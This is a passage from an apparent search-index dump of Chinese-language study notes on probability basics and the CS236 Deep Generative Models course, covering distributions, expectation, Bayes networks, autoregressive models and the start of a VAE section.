<p>\u6761\u4ef6\u6982\u7387\u662f\u6307\uff0c\u4e8b\u4ef6A\u5728\u4e8b\u4ef6B\u53d1\u751f\uff0c\u8fd9\u4e2a\u6761\u4ef6\u4e0b\u7684\u6982\u7387</p> \\[ P(A|B)=\\frac{P(A\\cap B)}{P(B)}\\ \\ \\ \\ \\ \\ \\ \\ \\ P(B)\\neq0 \\] <p>\u5982\u679c\\(P(A|B)=P(A)\\) \u5219\u79f0\u4e24\u4e2a\u4e8b\u4ef6\u662f\u72ec\u7acb\u7684</p> <p>random variables</p> <p>\u6709\u65f6\u6211\u4eec\u4e0d\u76f4\u63a5\u5173\u5fc3\u6837\u672c\u7a7a\u95f4\u7684\u6837\u672c\u672c\u8eab\uff0c\u800c\u662f\u5173\u6ce8\u5176\u4e2d\u7684\u67d0\u79cd\u6570\u503c\u3002\u4f8b\u5982\u5047\u8bbe\u968f\u673a\u8bd5\u9a8c\u662f\u629b10\u4e2a\u786c\u5e01\uff0c\u6211\u4eec\u5173\u5fc3\u8fd9\u6b21\u968f\u673a\u8bd5\u9a8c\u4e2d\u786c\u5e01\u6b63\u9762\u671d\u4e0a\u7684\u4e2a\u6570\u3002\u8fd9\u4e2a\u201c\u6b63\u9762\u671d\u4e0a\u7684\u4e2a\u6570\u201d\u5c31\u662f\u4e00\u4e2arandom variable</p> \\[ X:\\Omega\\rightarrow R \\] <p>\u6211\u4eec\u901a\u5e38\u7528\\(x\\)\u8868\u793arandom variable\u53ef\u80fd\u7684\u503c\uff0crandom variable\u57fa\u4e8e\u6837\u672c\u7a7a\u95f4\uff0c\u5176\u5b9e\u662f\u4e00\u79cd\u6620\u5c04\u5173\u7cfb</p> <p>\u5728\u4e0a\u8ff0\u7684\u4f8b\u5b50\u4e2d\uff0c\u5047\u8bbe\u968f\u673a\u53d8\u91cf\u7684\u503c\u4e3ak\uff0c\u90a3\u4e48\u6709\\(P(X=k):=P(\\{\\omega:X(\\omega)=k\\})\\)</p> <p>\u6839\u636e\u968f\u673a\u53d8\u91cf\u7684\u53d6\u503c\u662f\u5426\u8fde\u7eed\uff0c\u53ef\u4ee5\u533a\u5206\u6210discrete random variable\u548ccontinuous random variable</p> <p>CDF</p> <p>Cumulative distribution function \u7d2f\u79ef\u5206\u5e03\u51fd\u6570\uff0c\u8be5\u51fd\u6570 \\(F_X: \\mathbb{R} \\rightarrow [0,1]\\) \u5c0f\u4e8e\u7b49\u4e8e\u67d0\u4e2a\u968f\u673a\u53d8\u91cf\u7684\u6982\u7387</p> \\[ F_X(x)=P(X\\leq x) \\] <p>PMF</p> <p>Probability mass function \u6982\u7387\u8d28\u91cf\u51fd\u6570\uff0c\u524d\u63d0\u662f\u79bb\u6563\u968f\u673a\u53d8\u91cf\uff0c\u8be5\u51fd\u6570 \\(p_X: \\Omega \\rightarrow \\mathbb{R}\\)\uff0c\u76f4\u63a5\u8868\u793a\u79bb\u6563\u968f\u673a\u53d8\u91cf\u8be5\u503c\u7684\u6982\u7387</p> \\[ p_X(x)=P(X=x) \\] <p>PDF</p> <p>Probability density function \u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff0c\u524d\u63d0\u662f\u8fde\u7eed\u968f\u673a\u53d8\u91cf\uff0c\u662f\u6307CDF\u5728\u6b64\u5904\u7684\u5bfc\u6570\uff0c\u4f46\u540c\u65f6\u8fde\u7eed\u968f\u673a\u53d8\u91cf\u5e76\u975e\u4e00\u5b9a\u6709PDF</p> \\[ f_X(x)=\\frac{dF_X(x)}{dx} \\] <p>Exception</p> <p>\u671f\u671b\uff0c\u5bf9\u4e8e\u79bb\u6563\u968f\u673a\u53d8\u91cf\uff0c\u6211\u4eec\u6709PMF\u548c\u4e00\u4e2a\u4efb\u610f\u7684\u51fd\u6570\\(g:\\mathbb{R}\\rightarrow \\mathbb{R}\\)\uff0c\u6211\u4eec\u4f30\u8ba1\\(g(X)\\)\u7684\u671f\u671b</p> \\[ E[g(X)]=\\sum_{x\\in Val(X)}g(x)p_X(x) \\] <p>\u5bf9\u4e8e\u8fde\u7eed\u968f\u673a\u53d8\u91cf</p> \\[ E[g(X)]= \\int_{-\\infty}^{+\\infty}g(x)f_X(x)dx \\] <p>\u7279\u6b8a\u60c5\u51b5\\(g(x)=x\\)\uff0c\u6211\u4eec\u8ba4\u4e3a\u8fd9\u4e2a\u671f\u671b\u662f mean of random variable</p> <p>\u200b\u200b</p> <p>Variance</p> <p>\u65b9\u5dee\u53cd\u5e94\u968f\u673a\u53d8\u91cf\u518d\u5176\u5747\u503c\u5468\u56f4\u7684\u96c6\u4e2d\u7a0b\u5ea6</p> \\[ Var[x]=E[(X-E[X])^2]=E[x^2]-E[x]^2 \\] <p>\u200b\u200b</p> <p>some common random variables</p> <p>\u6709\u4e00\u4e9b\u5e38\u89c1\u7684random variables\uff0c\u4f8b\u5982\u5bf9\u4e8e\u79bb\u6563\u968f\u673a\u53d8\u91cf\u7684\u4f2f\u52aa\u5229\u5206\u5e03\uff0c\u5bf9\u4e8e\u8fde\u7eed\u968f\u673a\u53d8\u91cf\u7684\u6b63\u6001\u5206\u5e03\u7b49\u7b49</p> <p>\u200b\u200b</p> <p>\u591a\u4e2a\u968f\u673a\u53d8\u91cf</p> <p>joint and marginal distributions</p> <p>\u5bf9\u4e8eCDF</p> <p>\u5047\u8bbe\u6211\u4eec\u6709\u4e24\u4e2a\u968f\u673a\u53d8\u91cf\uff0c\u6211\u4eec\u5c06\u5176joint CDF\uff0c\u5b9a\u4e49\u4e3a</p> \\[ F_{XY}(x,y)=P(X\\leq x,\\  Y\\leq y) \\] <p>\u6211\u4eec\u4e5f\u53ef\u4ee5\u4ece\u4e0a\u8ff0joint CDF\u4e2d\u63d0\u53d6\u51famarginal CDF</p> \\[ F_X(x)=\\lim_{y\\rightarrow \\infty}F_{XY}(x,y)dy \\] <p>\u7c7b\u4f3c\u4e8eCDF\uff0c\u5269\u4e0b\u4e24\u79cd\u63cf\u8ff0function\u4e5f\u6709\u7c7b\u4f3c\u7684\u8054\u5408\u548c\u8fb9\u9645\u8ba1\u7b97\uff0c\u5bf9\u4e8ePMF</p> \\[ p_{XY}(x,y)=P(X=x, Y=y) \\] \\[ p_X(x)=\\sum_yp_{XY}(x,y) \\] <p>\u5bf9\u4e8ePDF</p> \\[ f_{XY}(x,y)=\\frac{\\partial^2F_{XY}(x, y)}{\\partial x\\partial y} \\] \\[ f_X(x)=\\int_{-\\infty}^{+\\infty}f_{XY}(x,y)dy \\]"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS236/CS236%20Deep%20Generative%20Models/#1-introduction","title":"1. Introduction","text":"<p>What I understand, I can create</p> <p>\u5f53\u6211\u4eec\u62e5\u6709\u4e00\u4e2a\u56fe\u50cf\u751f\u6210\u6a21\u578b\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u501f\u6b64\u6765\u5b8c\u6210\u89c6\u89c9\u7406\u89e3\u4efb\u52a1\uff1b\u751f\u6210\u6a21\u578b\u603b\u662f\u80fd\u591f\u5f88\u597d\u5730\u505a\u5230\u76f8\u53cd\u7684\u5de5\u4f5c</p> <p>\u6211\u4eec\u8bd5\u60f3\u4e00\u79cd\u751f\u6210\u6a21\u578b\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u5b8c\u6574\u7684\u6837\u672c\u7a7a\u95f4\uff0c\u800c\u9700\u8981\u751f\u6210\u7684\u76ee\u6807\u662f\u5b58\u5728\u4e00\u4e2a\u5e95\u5c42\u7684\u5206\u5e03\u89c4\u5f8b\u7684\uff0c\u6211\u4eec\u7684\u751f\u6210\u6a21\u578b\u5c31\u662f\u53bb\u62df\u5408\u8fd9\u4e48\u4e00\u4e2a\u5206\u5e03\u89c4\u5f8b</p> <p>\u5728\u8bad\u7ec3\u6a21\u578b\u7684\u53c2\u6570\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u7f29\u5c0f\u6a21\u578b\u7684\u6982\u7387\u5206\u5e03\u4e0e\u76ee\u6807\u7ed3\u679c\u7684\u6982\u7387\u5206\u5e03\u4e4b\u95f4\u7684\u8ddd\u79bb\u3002</p> <p>\u200b\u200b</p> \\[ \\min_{\\theta \\in M} d(p_{data}, p_{\\theta}) \\] <p>\u4f46\u662f\u7b80\u5355\u7684\u62bd\u8c61\u95ee\u9898\uff0c\u5b9e\u9645\u4e0a\u5728\u4e0a\u624b\u4e4b\u540e\u53c8\u8bf8\u591a\u56f0\u96be\u3002\u5305\u62ec\u4f18\u5316\u548c\u6570\u636e\u76ee\u6807\u9009\u53d6\u4e4b\u7c7b\u7684\u95ee\u9898\u3002\u5bf9\u4e8e\u4e00\u4e2a\u751f\u6210\u6a21\u578b\uff0c\u6709\u4ee5\u4e0b\u63a8\u7406\u57fa\u51c6</p> <ul> <li>Density estimation  \u72d7\u7684\u56fe\u7247\u7684\u6982\u7387\u5206\u5e03\u4e0e\u6a21\u578b\u7684\u8db3\u591f\u76f8\u8fd1</li> <li>Sampling  \u80fd\u591f\u751f\u6210\u65b0\u7684\u6837\u672c</li> <li>Unsupervised representation learning  \u53ef\u4ee5\u5b66\u4e60\u5230\u6709\u610f\u4e49\u7684\u7279\u5f81\u8868\u8fbe\uff0c\u7528\u4e8e\u7279\u6b8a\u4efb\u52a1\u7684\u5b66\u4e60</li> </ul> <p>\u672c\u8bfe\u7a0b\u7684\u6a21\u578b\u4e0d\u6d89\u53ca\u56fe\u5f62\u5b66\u7ed3\u6784\uff0c\u800c\u53ea\u6d89\u53ca\u6982\u7387\u5206\u5e03\u3002\u867d\u7136\u5728\u8bad\u7ec3\u6a21\u578b\u4e2d\u6211\u4eec\u540c\u65f6\u4f9d\u8d56\u4e8e\u6570\u636e\u548c\u5148\u9a8c\u77e5\u8bc6\uff0c\u4f46\u662f\u5728\u672c\u8282\u8bfe\u4e2d\u8fd8\u662f\u66f4\u5173\u6ce8\u4e8e\u6570\u636e\u9a71\u52a8</p> <p>\u200b\u200b</p> <p>\u751f\u6210\u6a21\u578b\u5c31\u662f\u53bb\u751f\u6210\u4e00\u4e2a\u6982\u7387\u5206\u5e03 \\(p(x)\\)</p> <ul> <li>Data: samples</li> <li>Prior knowledge \u53c2\u6570\u5f62\u5f0f\uff0closs function\uff0coptimization</li> </ul> <p>\u63a7\u5236\u4fe1\u53f7\u5c31\u662f\u53ef\u80fd\u662f\uff0c\u56fe\u50cf\u63cf\u8ff0\uff0c\u9700\u8981\u4fee\u8865\u7684\u56fe\u50cf\u7b49\u7b49</p> <p>\u200b\u200b</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS236/CS236%20Deep%20Generative%20Models/#2-background","title":"2. Background","text":"<p>\u5728\u8fd9\u4e2a\u57fa\u672c\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u9700\u8981</p> <ul> <li>\u5b9a\u4e49\u4e00\u4e2amodel family</li> <li>\u9700\u8981\u4e00\u4e9b data</li> <li>\u5b9a\u4e49 loss function</li> </ul> <p>\u5982\u4f55\u4f30\u8ba1\u6982\u7387\u5206\u5e03</p> <p>\u7ef4\u5ea6\u707e\u96be\u662f\u673a\u5668\u5b66\u4e60\u9886\u57df\u7684\u95ee\u9898\uff0c\u8868\u8ff0\u9ad8\u7ef4\u6570\u636e\u7684\u6982\u7387\u5206\u5e03\u662f\u56f0\u96be\u7684\u3002</p> <p>\u6211\u4eec\u5148\u4ecb\u7ecd\u4e00\u4e9b\u7b80\u5355\u7684\u6982\u7387\u5206\u5e03\uff0c\u4f8b\u5982\u4f2f\u52aa\u5229\u5206\u5e03\uff0cCategorical distribution</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5355\u72ec\u7684\u50cf\u7d20\uff0c\u5c31\u662fRGB\u90fd0 - 255\uff0c\u6211\u4eec\u5c31\u6709256 * 256 * 256 - 1\u4e2a\u6837\u672c\u7a7a\u95f4</p> <p>\u6837\u672c\u7a7a\u95f4\u4e0e\u53c2\u6570\u7684\u5173\u7cfb</p> <p>Chain rule \u5206\u89e3\u8054\u5408\u5206\u5e03\uff0c\u8fd9\u662f\u81ea\u56de\u5f52\u6a21\u578b\u4e2d\u6700\u5e38\u4f7f\u7528\u7684\u4e1c\u897f</p> <p>\u200b\u200b</p> <p>\u65e0\u635f\u5931\u7684\u5206\u89e3\u5982\u4e0a\uff0c\u4f46\u662f\u8fd9\u4e2a\u5206\u89e3\u5e76\u4e0d\u80fd\u89e3\u51b3\u6307\u6570\u7206\u70b8\u7684\u95ee\u9898\uff0c\u6211\u4eec\u6240\u9700\u7684\u63cf\u8ff0\u53c2\u6570\u4f9d\u65e7\u662f\u6307\u6570\u7ea7\u522b\u7684</p> <p>\u9700\u8981\u6446\u8131\u6307\u6570\u7ea7\u522b\u7684\u53c2\u6570\uff0c\u6211\u4eec\u9700\u8981\u505a\u51fa\u76f8\u5e94\u7684\u5047\u8bbe\uff0c\u4f8b\u5982\u5047\u8bbe\u987a\u5e8f\u7684\u4f9d\u8d56\uff0c\u4f8b\u5982\\(x_n\\)\u4f9d\u8d56\u4e8e\\(x_{n-1}\\)\uff0c\u800c\u4e8e\u5176\u4ed6\u7684\\(x\\)\u72ec\u7acb\uff0c\u8fd9\u5c31\u662f\u9a6c\u5c14\u79d1\u592b\u8fc7\u7a0b\u7684\u5b9e\u8df5\uff0c\u6bd4\u5b8c\u5168\u72ec\u7acb\u7684\u66f4\u597d\uff0c\u4f46\u662f\u53c8\u53ef\u4ee5\u5b9e\u8df5</p> <p>\u200b\u200b</p> <p>\u4f46\u662f\u8fd9\u4e2a\u5047\u8bbe\u5728\u591a\u6570\u60c5\u51b5\u4e0b\u8fd8\u662f\u8fc7\u4e8e\u5f3a\uff0c\u76f8\u5f53\u4e8e\u53ea\u6839\u636e\u524d\u4e00\u4e2a\u8bcd\u8bed\u9884\u6d4b\u4e0b\u4e00\u4e2a\u8bcd\u8bed\uff0c\u79f0\u4e3a\u94fe\u5f0f\u5047\u8bbe\uff0c\u6211\u6269\u5c55\u8fd9\u4e2a\u60f3\u6cd5\uff0c\u5f97\u5230Bayes Network</p> <p>\u200b\u200b</p> <p>\u6765\u4e00\u4e2a\u4f8b\u5b50\u89e3\u91caBayes Network\uff0c\u5c06\u5173\u8054\u5173\u7cfb\u8f6c\u6362\u6210\u4e00\u79cd\u6709\u5411\u65e0\u73af\u56fe\uff0c\u6211\u4eec\u4e4b\u524d\u7684\u94fe\u5f0f\u5047\u8bbe\u5c31\u662f\u5176\u4e2d\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\uff0c\u5176\u662f\u4e00\u79cd\u57fa\u4e8e\u6761\u4ef6\u72ec\u7acb\u6765\u7b80\u5316\u590d\u6742\u5206\u5e03\u7684\u505a\u6cd5</p> <p>\u200b\u200b</p> <p>\\(a\\perp b\\)\uff0c\u8868\u793aa,b\u76f8\u4e92\u72ec\u7acb</p> <p>\u5224\u522b\u6a21\u578b\u603b\u662f\u5728x\u4e0ey\u4e4b\u95f4\u7684\u5173\u7cfb\u8fdb\u884c\u5efa\u6a21\uff0c\u800c\u751f\u6210\u6a21\u578b\u9700\u8981\u5bf9\u6574\u4e2a\u6570\u636ex\u8fdb\u884c\u5efa\u6a21</p> <p>\u200b\u200b</p> <p>Logistic regression</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5224\u522b\u6a21\u578b\uff0c\u6211\u4eec\u7ed9\u4e88\u4ed6Linear dependence\uff0c\u53ef\u4ee5\u6b65\u5165\u6211\u4eec\u719f\u6089\u7684\u7ebf\u6027\u6a21\u578b</p> <p>\u5982\u679c\u8981\u6446\u8131Linear dependenece, \u6211\u4eec\u53ef\u4ee5\u8f6c\u5411Neural Models</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS236/CS236%20Deep%20Generative%20Models/#3-autoregressive-model","title":"3. Autoregressive Model","text":"<p>\u5728\u81ea\u56de\u5f52\u6a21\u578b\u4e2d\uff0c\u5176\u4f1a\u5047\u8bbe\u6761\u4ef6\u6982\u7387\u5206\u5e03\u6ee1\u8db3\u67d0\u79cd\u5206\u5e03\uff0c\u4f8b\u5982\u4f2f\u52aa\u5229\u5206\u5e03</p> \\[ p_{\\theta_i}(x_i|X_{&lt;i})=Bern(f_i(x_1,x_2,...,x_{i-1})) \\] <p>\u4f2f\u52aa\u5229\u5206\u5e03\u4ec5\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u6765\u63cf\u8ff0\u5176\u5206\u5e03</p> <p>\u200b\u200b</p> <p>\u5728\u63cf\u8ff0\u6982\u7387\u5206\u5e03\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86\u4ee5\u4e0a\u7684\u65b9\u6cd5\uff0c\u4ece\u6700\u5f00\u59cb\u94fe\u5f0f\u6cd5\u5219\u5217\u8868\uff0c\u7528\u6307\u6570\u7ea7\u522b\u7684\u53c2\u6570\u53bb\u63cf\u8ff0\uff1b\u5728\u901a\u8fc7\u5148\u9a8c\u6761\u4ef6\uff0c\u53bb\u8bbe\u8ba1\u8d1d\u53f6\u65af\u7f51\u7edc\uff0c\u964d\u4f4e\u5217\u8868\u6cd5\u7684\u53c2\u6570\uff0c\u6700\u540e\u8f6c\u5411\u795e\u7ecf\u7f51\u7edc\uff0c\u4f9d\u9760\u795e\u7ecf\u7f51\u7edc\u7684\u51fd\u6570\u53bb\u6a21\u62df\u6620\u5c04\u5173\u7cfb</p> <p>\u5f53\u6211\u4eec\u9700\u8981\u8f6c\u5411\u751f\u6210\u6a21\u578b\u7684\u65f6\u5019\uff0c\u81ea\u56de\u5f52\u6a21\u578b\u5c31\u662f\u5e0c\u671b\u6211\u4eec\u4f9d\u9760\u5df2\u7ecf\u751f\u6210\u7684part\u6765\u751f\u6210\u65b0\u7684part\uff0c\u4e2d\u95f4\u53ef\u4ee5\u63d2\u5165\u795e\u7ecf\u7f51\u7edc</p> <p>\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u9700\u8981\u751f\u6210\u624b\u5199\u6570\u5b57\u7684\u56fe\u50cf\uff0c\u6211\u4eec\u4f9d\u9760MNIST\u6570\u636e\u96c6\u5408\uff0c\u6211\u4eec\u9700\u8981\u5efa\u6a21\u4e00\u4e2a28x28\u7684\u968f\u673a\u53d8\u91cf\u96c6\u5408</p> <p>\u5f53\u6211\u4eec\u4f7f\u7528\u81ea\u56de\u5f52\u6a21\u578b\u505a\u751f\u6210\u7684\u65f6\u5019\uff0c\u603b\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u987a\u5e8f\uff0c\u5728\u6587\u672c\u751f\u6210\u4e2d\u987a\u5e8f\u662f\u5f88\u81ea\u7136\u7684\u4e8b\u60c5\uff0c\u800c\u56fe\u50cf\u6211\u4eec\u8981\u81ea\u884c\u5b9a\u4e49\uff0c\u4f8b\u5982\u4ece\u5de6\u4e0a\u89d2\u7684\u50cf\u7d20\u5230\u53f3\u4e0b\u89d2\u7684\u50cf\u7d20</p> <p>\u57fa\u4e8e\u7ebf\u6027\u5047\u8bbe\u7684Autoregressive Generate Model</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u57fa\u4e8e\u7ebf\u6027\u5047\u8bbe\uff0c\u63a8\u5bfc\u6982\u7387\u516c\u5f0f\u7684\u72b6\u6001\uff0c\u5c31\u662fFVSBN fully visible sigmoid belief network</p> <p>\u200b\u200b</p> <p>\u968f\u540e\u6211\u4eec\u5bf9\u4e8e\u987a\u5e8f\u4e2d\u7684\u7b2c\u4e00\u4e2a\u50cf\u7d20\u8fdb\u884c\u968f\u673a\u751f\u6210\uff0c\u7136\u540e\u4e4b\u540e\u5c06\u8fdb\u884c\u94fe\u5f0f\u63a8\u5bfc\u91c7\u6837</p> <p>\u57fa\u4e8e\u8fd9\u79cd\u7ebf\u6027\u5047\u8bbe\u7684\u6a21\u578b\uff0c\u53c2\u6570\u6570\u91cf\u662f\\(O(n^2)\\)\uff0c\u57fa\u4e8e\u8be5\u79cd\u5047\u8bbe\u80fd\u591f\u5f97\u5230\u7684\u6548\u679c\u57fa\u672c\u5982\u4e0b\uff0c\u663e\u7136\u5e76\u975e\u662f\u8db3\u591f\u4f18\u79c0\u7684\u7ed3\u679c</p> <p>\u200b\u200b</p> <p>\u57fa\u4e8e\u795e\u7ecf\u7f51\u7edc\u7684 Autoregressive Generate Model</p> <p>\u6211\u4eec\u4f7f\u7528\u5355\u5c42\u7684\u795e\u7ecf\u7f51\u7edc\u6765\u66ff\u4ee3\u7ebf\u6027\u5173\u7cfb</p> \\[ h_i=\\sigma(A_ix_{&lt;i}+c_i) \\] <p>\u795e\u7ecf\u7f51\u7edc\u6a21\u578b\u7684\u53c2\u6570\u7ea7\u522b\u57fa\u672c\u662f\u7ebf\u6027\u7684\uff0c\u6240\u6709\u7684part\u7684\u53c2\u6570\u90fd\u662f\u6700\u7ec8\u7684\u77e9\u9635\u4e2d\u7684\u4e00\u90e8\u5206\uff0c\u795e\u7ecf\u7f51\u7edc\u6a21\u578b\u7684\u5047\u8bbe\u5c31\u662f\uff0c\u4f8b\u5982\u5728\u56fe\u50cf\u4efb\u52a1\u4e2d\uff0c\u6bcf\u4e2a\u50cf\u7d20\u70b9\u603b\u662f\u548c\u5176\u4ed6\u7684\u50cf\u7d20\u70b9\u6709\u67d0\u79cd\u76f8\u5173</p> <p>\u5bf9\u4e8e\u8fde\u7eed\u7684\u6570\u636e\u5efa\u6a21</p> <p>\u4e0a\u8ff0\u7684\u795e\u7ecf\u7f51\u7edc\u6a21\u578b\uff0c\u9884\u6d4b\u7684\u662f0\u62161\uff0c\u4e5f\u5c31\u662f\u8be5\u50cf\u7d20\u662f\u767d\u8fd8\u662f\u9ed1\uff0c\u90a3\u4e48\u5982\u4f55\u5bf9\u4e8e\u8fde\u7eed\u7684\u6570\u636e\u8fdb\u884c\u5efa\u6a21\u5462\u3002</p> <p>\u5728\u4e0a\u6587\u6211\u4eec\u5c06\u795e\u7ecf\u7f51\u7edc\u7684\u8f93\u51fa\u4f5c\u4e3a\u4f2f\u52aa\u5229\u5206\u5e03\u7684\u53c2\u6570\uff0c\u7136\u540e\u5982\u679c\u9700\u8981\u5bf9\u8fde\u7eed\u6570\u636e\u5efa\u6a21\uff0c\u5219\u9700\u8981\u91c7\u53d6\u5176\u4ed6\u7684\u65b9\u6cd5\uff0c\u4f8b\u5982\u5c06\u795e\u7ecf\u7f51\u7edc\u7684\u8f93\u51fa\u4f5c\u4e3a\u591a\u4e2a\u9ad8\u65af\u5206\u5e03\u7684\u53c2\u6570\uff0c\u7136\u540e\u5c06\u591a\u4e2a\u9ad8\u65af\u5206\u5e03\u6765\u62df\u5408\u9700\u8981\u7684\u51fd\u6570\u3002</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u6a21\u578b\u4e0eAE</p> <p>\u4e0a\u8ff0\u6a21\u578b\u5728\u8868\u9762\u4e0a\u548cAuto encoder\u6709\u70b9\u76f8\u4f3c\uff0cAuto encoder\u5c31\u662f\u5c06\u539f\u6570\u636e\u6620\u5c04\u5230\u67d0\u79cd\u6f5c\u5728\u8868\u793a\uff0c\u7136\u540e\u518d\u901a\u8fc7\u4e00\u4e9b\u795e\u7ecf\u7f51\u7edc\uff0c\u5c06\u5176\u8f6c\u6362\u56de\u539f\u6570\u636e\uff0c\u6211\u4eec\u4f1a\u91c7\u53d6\u4e00\u4e9b\u673a\u5236\u9632\u6b62AE\u5b66\u4e60\u6052\u7b49\u53d8\u6362</p> <p>\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u786e\u5b9e\u548c\u81ea\u56de\u5f52\u6a21\u578b\u6709\u70b9\u76f8\u4f3c\uff0c\u90fd\u662f\u9700\u8981\u901a\u8fc7\u9884\u6d4b\u91cd\u5efa\u81ea\u8eab</p> <p>RNN</p> <p>\u200b\u200b</p> <p>\u6839\u636e\u5faa\u73af\u53bb\u5904\u7406\u591a\u4e2a\u5411\u91cf\u4ece\u800c\u83b7\u5f97\u5355\u4e2a\u5411\u91cf\u7684\u8868\u8ff0\uff0c\u8fd9\u4e2a\u5411\u91cf\u4f1a\u8868\u8ff0\u4e0b\u4e00\u4e2atoken\u5e94\u8be5\u5728\u54ea\u8fb9\u8d4b\u4e88\u66f4\u9ad8\u7684\u6982\u7387\u3002</p> <p>\u4f46\u662f\u95ee\u9898\u5728\u4e8e\u5176\u53ea\u80fd\u591f\u8fd9\u4e48\u4e00\u4e2a\u5411\u91cf\u603b\u7ed3\u6240\u6709\u7684\u4e0a\u6587\u4fe1\u606f\uff0c\u4e5f\u5c31\u53ea\u6709\u8fd9\u4e48\u4e00\u4e2a\u5411\u91cf\u4f1a\u5f71\u54cd\u4e0b\u4e00\u6b65\u7684\u9884\u6d4b\uff0c\u5e76\u4e14RNN\u7684\u66f4\u65b0\u5e76\u4e0d\u80fd\u505a\u5230\u5e76\u884c\uff0c\u8bad\u7ec3\u8d77\u6765\u6548\u7387\u8f83\u4f4e</p> <p>RNN\u5176\u5b9e\u4e5f\u53ef\u4ee5\u5bf9\u4e8e\u56fe\u50cf\u8fdb\u884c\u5efa\u6a21 Pixel RNN</p> <p>CNN</p> <p>pixel CNN\uff0cCNN\u5728\u56fe\u50cf\u5206\u7c7b\u4e0a\u505a\u7684\u5f88\u597d\uff0c\u4f46\u662f\u5728\u751f\u6210\u4efb\u52a1\u4e2d\uff0c\u4e3a\u4e86\u5339\u914d\u81ea\u56de\u5f52\u6a21\u578b\u7684\u7406\u8bba\u8bbe\u8ba1\uff0c\u9700\u8981\u8ba9\u5176\u65e0\u6cd5\u770b\u5230\u540e\u7eed\u7684\u5185\u5bb9</p> <p>\u200b\u200b</p> <p>Attention based models</p> <p>\u200b\u200b</p> <p>\u6ce8\u610f\u529b\u673a\u5236\uff0c\u57fa\u672c\u4e0a\u8bf4\u6211\u4eec\u53ef\u4ee5\u52a8\u7528\u6574\u4e2a\u5e8f\u5217\uff0c\u5b58\u50a8\u6574\u4e2a\u4e0a\u6587\u8fdb\u884c\u5e76\u884c\u7684\u76f8\u4f3c\u5ea6\u8ba1\u7b97\uff0c\u8f6c\u6362\u6210\u6ce8\u610f\u529b\u5206\u6570\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5f52\u4e00\u5316\u5230\u6211\u4eec\u9700\u8981\u5173\u6ce8\u54ea\u4e9b\u5143\u7d20\uff0c\u5e76\u4e14\u57fa\u4e8e\u8fd9\u4e2a\u56e0\u7d20\u6211\u4eec\u83b7\u53d6\u4e0b\u4e00\u4e2atoken\uff0c\u7136\u540e\u518d\u57fa\u4e8e\u8fd9\u4e2atoken\u6211\u4eec\u518d\u53bb\u9884\u6d4b\u4e0b\u4e00\u4e2a\uff0c\u5f62\u6210\u81ea\u56de\u5f52\uff08\u5982\u679c\u8981\u786e\u4fdd\u81ea\u56de\u5f52\u7684\u8bdd\u8fd8\u9700\u8981\u63a9\u7801\u673a\u5236\uff09</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/CS236/CS236%20Deep%20Generative%20Models/#4-vae","title":"4. VAE","text":"<p>\u81ea\u56de\u5f52\u6a21\u578b\u7684\u56f0\u5883\u5728\u4e8e\uff0c\u6211\u4eec\u603b\u662f\u9700\u8981\u9009\u62e9\u4e00\u4e2a\u751f\u6210\u987a\u5e8f\uff0c\u5728\u67d0\u4e9b\u751f\u6210\u4efb\u52a1\u4e2d\u662f\u7b80\u5355\u7684\uff0c\u6709\u4e9b\u4efb\u52a1\u4e2d\u5c31\u8ba9\u4eba\u7591\u60d1\u3002\u5e76\u4e14\u5373\u4fbf\u6709Transformer\u8fd9\u79cd\u5f88\u5f3a\u5927\u7684\u5e76\u884c\u5de5\u5177\uff0c\u6211\u4eec\u4ecd\u7136\u751f\u6210\u901f\u5ea6\u6bd4\u8f83\u6162\uff0c\u56e0\u4e3a\u6211\u4eec\u603b\u662f\u9700\u8981\u4e00\u4e2a\u53d8\u91cf\u4e00\u4e2a\u53d8\u91cf\u5730\u751f\u6210\uff0c\u8fd9\u662f\u7531\u94fe\u5f0f\u6cd5\u5219\u672c\u8eab\u7684\u9650\u5236\u5bfc\u81f4\u7684\u3002\u5e76\u4e14\u6709\u4e9b\u60c5\u51b5\u4e0b\u6211\u4eec\u96be\u4ee5\u505a\u5230\u65e0\u76d1\u7763\u5730\u5b66\u4e60\uff0c\u800c\u6211\u4eec\u5728\u6f5c\u53d8\u91cf\u6a21\u578b\u4e2d\u53ef\u4ee5\u6bd4\u8f83\u597d\u505a\u5230\u8fd9\u4e00\u70b9\u3002</p> 